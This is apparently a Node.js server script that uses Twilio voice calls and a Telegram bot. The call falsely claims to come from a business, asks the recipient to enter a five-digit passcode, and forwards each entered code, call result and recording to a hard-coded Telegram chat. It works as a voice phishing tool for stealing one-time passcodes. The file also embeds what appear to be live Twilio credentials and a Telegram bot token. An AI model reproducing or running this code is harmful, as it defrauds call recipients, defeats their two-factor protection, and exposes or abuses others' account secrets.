const express = require('express');
const axios = require('axios') 
const bodyParser = require('body-parser');
const VoiceResponse = require('twilio').twiml.VoiceResponse;
const client = require('twilio')('AC17dc9fe91f769fba66f6e8611597b0b7', 'ff1eb0ed390bc6f23dfb9a4e4821d0b9');
const http = require('http'); // or 'https' for https:// URLs
const https = require('https'); // or 'https' for https:// URLs
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const port = 3000;
const token = '6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs';

const bot = new TelegramBot(token, { polling: false })
axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Server started') 


app.use(bodyParser.urlencoded({ extended: true }));

app.post('/outgoing-call', (req, res) => {
axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Received outgoing call') 
  const twiml = new VoiceResponse();
  twiml.say('Hello i am calling from a seatle please enter 5 digit passcode');

  twiml.gather({
    numDigits: 5,
    timeout:20,
    action: '/handle-key',
    method: 'POST'
  }, gatherNode => {
    gatherNode.say('Press 1 to confirm your choice.');
  });

  res.type('text/xml');
  res.send(twiml.toString());
});

app.post('/handle-key', (req, res) => {
  const digitPressed = req.body.Digits;
  console.log(`Digit pressed: ${digitPressed}`);
  axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Digit pressed: ' + digitPressed) 

  // Add logic to handle the pressed digit

  const twiml = new VoiceResponse();
  res.type('text/xml');
  res.send(twiml.toString());
});

app.post('/callOutputs', (req, res) => {
    axios.get('https://api.telegram.org/bot6779436184:AAFGKAstq58C0VLpUfDkA4dqebGmpNj3vUs/sendMessage?chat_id=5113588348&text=Call result: ' + JSON.stringify(req.body)) 
    if(req.body.RecordingUrl){
        // bot.sendAudio("5113588348",req.body.RecordingUrl + ".mp3")
        bot.sendAudio("5113588348","https://api.twilio.com/2010-04-01/Accounts/AC17dc9fe91f769fba66f6e8611597b0b7/Recordings/RE5cebc1eb0e461655bdb128a1c31ec837.mp3")
    }
});

app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});

